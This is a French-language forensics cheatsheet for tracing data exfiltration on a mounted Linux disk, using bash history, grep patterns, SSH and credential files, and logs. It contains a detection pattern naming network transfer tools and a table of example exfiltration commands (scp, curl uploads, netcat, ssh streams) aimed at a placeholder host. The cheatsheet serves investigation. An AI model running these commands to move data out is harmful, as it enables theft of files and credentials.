# 🧾 Linux Exfiltration Forensics Cheatsheet

## 🔍 1. Historique de commandes
```bash
cat /mnt/liam_disk/home/liam/.bash_history
grep -aiE "scp|rsync|curl|wget|ftp|nc|ssh|sftp" /mnt/liam_disk/home/liam/.bash_history
```

## 🧠 2. Fichiers de scripts ou alias suspects
```bash
find /mnt/liam_disk/home/liam -type f -name "*transfer*"
cat /mnt/liam_disk/home/liam/transferfiles  # si c'est un script
```

## 🧰 3. Commandes d'exfiltration courantes

| Outil        | Exemple                                                    | But                                  |
|--------------|------------------------------------------------------------|---------------------------------------|
| `scp`        | `scp file.txt user@host:/path`                             | Envoi de fichier via SSH             |
| `rsync`      | `rsync -avz file.txt user@host:/path`                      | Sync sécurisé                        |
| `curl`       | `curl -T file.txt ftp://host --user user:pass`            | Upload HTTP/FTP                      |
| `wget`       | `wget --method=PUT --body-file=file.txt http://host/path` | Envoi HTTP                           |
| `ftp`        | `ftp host` → `put file.txt`                                | Envoi via FTP interactif             |
| `nc` (netcat)| `nc host port < file.txt`                                  | Transfert brut (non sécurisé)        |
| `ssh`        | `ssh user@host "cat > /path/file.txt" < file.txt`         | Upload par stream                    |
| `sftp`       | `sftp user@host` → `put file.txt`                          | Mode sécurisé de FTP via SSH         |

## 🛠️ 4. Fichiers suspects liés à ces commandes
```bash
grep -ai "host\|user\|pass\|ip" /mnt/liam_disk/home/liam/* 2>/dev/null
```

## 📡 5. Adresse IP ou domaine cible
```bash
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /mnt/liam_disk/home/liam/.bash_history
grep -Ei 'https?://[^ ]+' /mnt/liam_disk/home/liam/.bash_history
```

## 📁 6. Autres sources utiles
- `~/.ssh/known_hosts` → IPs/hosts précédemment contactés
- `~/.ssh/config` → redirections SSH
- `~/.netrc` → credentials FTP
- `cronjobs` → automatisation de l’exfiltration

---

💡 **Astuce** : croise les timestamps des commandes avec les connexions réseau dans `/var/log/auth.log` ou `/var/log/syslog`.
